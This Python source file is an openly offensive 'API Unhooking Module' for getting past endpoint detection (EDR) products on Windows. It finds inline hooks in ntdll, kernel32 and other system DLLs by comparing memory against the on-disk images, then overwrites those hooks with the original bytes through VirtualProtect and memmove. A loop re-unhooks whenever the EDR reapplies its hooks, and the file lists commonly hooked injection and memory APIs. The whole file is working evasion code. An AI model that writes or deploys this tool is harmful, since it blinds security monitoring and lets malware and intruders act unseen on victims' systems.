"""
API Unhooking Module

Detects and removes EDR hooks from Windows API functions.

EDRs operate by hooking userland APIs to monitor suspicious behavior.
This module defeats that by restoring original function bytes.
"""

import ctypes
import logging
import os
import sys
from dataclasses import dataclass
from typing import List, Optional

try:
    import pefile

    PEFILE_AVAILABLE = True
except ImportError:
    PEFILE_AVAILABLE = False


@dataclass
class APIHook:
    """Information about a hooked API"""

    module: str
    function: str
    address: int
    original_bytes: bytes
    hooked_bytes: bytes
    hook_target: Optional[int] = None  # Where the hook jumps to


class APIUnhooker:
    """
    API unhooking engine for EDR bypass.

    Detects and removes API hooks by comparing in-memory function
    prologues with their on-disk (clean) versions.

    Techniques:
    1. Compare memory vs disk bytes
    2. Restore original bytes
    3. Flush instruction cache
    4. Optionally monitor for re-hooking
    """

    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.hooks: List[APIHook] = []

    def scan_module(self, module_name: str) -> List[APIHook]:
        """
        Scan a module for API hooks.

        Args:
            module_name: Module to scan (e.g., "ntdll.dll")

        Returns:
            List of detected hooks
        """
        if sys.platform != "win32":
            self.logger.error("Windows only")
            return []

        if not PEFILE_AVAILABLE:
            self.logger.error("pefile required")
            return []

        hooks = []

        try:
            # Get module handle
            kernel32 = ctypes.windll.kernel32
            module_handle = kernel32.GetModuleHandleW(module_name)

            if not module_handle:
                self.logger.error(f"Module not loaded: {module_name}")
                return []

            # Get module path
            module_path = self._get_module_path(module_name)
            if not module_path:
                self.logger.error(f"Module path not found: {module_name}")
                return []

            # Load clean PE from disk
            pe = pefile.PE(module_path, fast_load=True)
            pe.parse_data_directories(
                directories=[pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
            )

            if not hasattr(pe, "DIRECTORY_ENTRY_EXPORT"):
                return []

            # Check each exported function
            for export in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                if not export.name:
                    continue

                func_name = export.name.decode("utf-8")
                func_rva = export.address

                # Skip forwarded exports
                if func_rva >= pe.OPTIONAL_HEADER.DATA_DIRECTORY[0].VirtualAddress:
                    continue

                # Calculate memory address
                func_address = module_handle + func_rva

                # Read bytes from memory and disk
                memory_bytes = self._read_memory(func_address, 32)
                disk_bytes = pe.get_data(func_rva, 32)

                # Compare
                if memory_bytes[:16] != disk_bytes[:16]:  # Check first 16 bytes
                    hook = APIHook(
                        module=module_name,
                        function=func_name,
                        address=func_address,
                        original_bytes=disk_bytes[:16],
                        hooked_bytes=memory_bytes[:16],
                    )

                    # Try to determine hook target
                    hook.hook_target = self._parse_hook_target(memory_bytes)

                    hooks.append(hook)
                    self.logger.warning(f"Hook detected: {module_name}!{func_name}")

        except Exception as e:
            self.logger.error(f"Error scanning {module_name}: {e}")

        self.hooks.extend(hooks)
        return hooks

    def _get_module_path(self, module_name: str) -> Optional[str]:
        """Get full path to a module"""
        system_root = os.environ.get("SystemRoot", "C:\\Windows")
        paths = [
            os.path.join(system_root, "System32", module_name),
            os.path.join(system_root, "SysWOW64", module_name),
        ]

        for path in paths:
            if os.path.exists(path):
                return path

        return None

    def _read_memory(self, address: int, size: int) -> bytes:
        """Read memory at address"""
        try:
            buffer = (ctypes.c_char * size)()
            kernel32 = ctypes.windll.kernel32
            kernel32.ReadProcessMemory(
                kernel32.GetCurrentProcess(), ctypes.c_void_p(address), buffer, size, None
            )
            return bytes(buffer)
        except Exception:
            return b"\x00" * size

    def _parse_hook_target(self, hooked_bytes: bytes) -> Optional[int]:
        """Try to parse where the hook jumps to"""
        if len(hooked_bytes) < 5:
            return None

        # Check for JMP instruction (E9)
        if hooked_bytes[0] == 0xE9:
            # Relative JMP - calculate target
            offset = int.from_bytes(hooked_bytes[1:5], "little", signed=True)
            # Target would need base address to calculate
            return offset

        # Check for JMP [rip+offset] (FF 25)
        if hooked_bytes[0:2] == b"\xff\x25":
            offset = int.from_bytes(hooked_bytes[2:6], "little", signed=True)
            return offset

        return None

    def unhook(self, hook: APIHook) -> bool:
        """
        Remove a hook by restoring original bytes.

        Args:
            hook: Hook to remove

        Returns:
            True if successful
        """
        if sys.platform != "win32":
            return False

        try:
            kernel32 = ctypes.windll.kernel32

            # Change memory protection to writable
            old_protect = ctypes.c_ulong()
            size = len(hook.original_bytes)

            success = kernel32.VirtualProtect(
                ctypes.c_void_p(hook.address),
                size,
                0x40,  # PAGE_EXECUTE_READWRITE
                ctypes.byref(old_protect),
            )

            if not success:
                self.logger.error(f"VirtualProtect failed for {hook.function}")
                return False

            # Write original bytes
            ctypes.memmove(ctypes.c_void_p(hook.address), hook.original_bytes, size)

            # Restore original protection
            kernel32.VirtualProtect(
                ctypes.c_void_p(hook.address), size, old_protect.value, ctypes.byref(old_protect)
            )

            # Flush instruction cache
            kernel32.FlushInstructionCache(
                kernel32.GetCurrentProcess(), ctypes.c_void_p(hook.address), size
            )

            self.logger.info(f"Unhooked: {hook.module}!{hook.function}")
            return True

        except Exception as e:
            self.logger.error(f"Unhooking failed: {e}")
            return False

    def unhook_all(self) -> int:
        """
        Unhook all detected hooks.

        Returns:
            Number of successfully removed hooks
        """
        count = 0
        for hook in self.hooks:
            if self.unhook(hook):
                count += 1

        return count

    def scan_common_modules(self) -> List[APIHook]:
        """
        Scan commonly hooked modules.

        Returns:
            All detected hooks
        """
        common_modules = [
            "ntdll.dll",
            "kernel32.dll",
            "kernelbase.dll",
            "user32.dll",
            "advapi32.dll",
            "ws2_32.dll",
        ]

        all_hooks = []

        for module in common_modules:
            hooks = self.scan_module(module)
            all_hooks.extend(hooks)

        return all_hooks

    def monitor_rehooking(self, interval: float = 1.0, callback: Optional[callable] = None):
        """
        Monitor for re-hooking by EDR.

        Some EDRs will detect unhooking and re-apply hooks.
        This function monitors for that and can re-unhook.

        Args:
            interval: Check interval in seconds
            callback: Optional callback when re-hooking detected
        """
        import time

        self.logger.info("Monitoring for re-hooking (Ctrl+C to stop)...")

        try:
            while True:
                time.sleep(interval)

                # Re-check each hook location
                for hook in self.hooks:
                    current_bytes = self._read_memory(hook.address, len(hook.original_bytes))

                    if current_bytes != hook.original_bytes:
                        self.logger.warning(f"Re-hooking detected: {hook.module}!{hook.function}")

                        # Re-unhook
                        self.unhook(hook)

                        if callback:
                            callback(hook)

        except KeyboardInterrupt:
            self.logger.info("Monitoring stopped")


# Pre-defined hook patterns for detection
COMMON_HOOK_PATTERNS = {
    "inline_jmp": {"pattern": b"\xe9", "description": "Inline JMP hook"},  # JMP rel32
    "inline_jmp_rip": {
        "pattern": b"\xff\x25",  # JMP [rip+offset]
        "description": "RIP-relative JMP hook",
    },
    "hotpatch": {
        "pattern": b"\xeb\xf9",  # JMP -7 (Microsoft hotpatch)
        "description": "Microsoft hotpatch hook",
    },
}


# Common EDR-hooked functions
EDR_HOOKED_FUNCTIONS = {
    "ntdll.dll": [
        "NtCreateThread",
        "NtCreateThreadEx",
        "NtQueueApcThread",
        "NtWriteVirtualMemory",
        "NtReadVirtualMemory",
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtMapViewOfSection",
        "NtUnmapViewOfSection",
        "NtOpenProcess",
        "NtOpenThread",
        "NtCreateFile",
        "NtWriteFile",
        "NtSetInformationThread",
    ],
    "kernel32.dll": [
        "CreateProcessA",
        "CreateProcessW",
        "CreateRemoteThread",
        "CreateRemoteThreadEx",
        "VirtualAllocEx",
        "VirtualProtectEx",
        "WriteProcessMemory",
        "ReadProcessMemory",
        "LoadLibraryA",
        "LoadLibraryW",
        "CreateFileA",
        "CreateFileW",
    ],
}
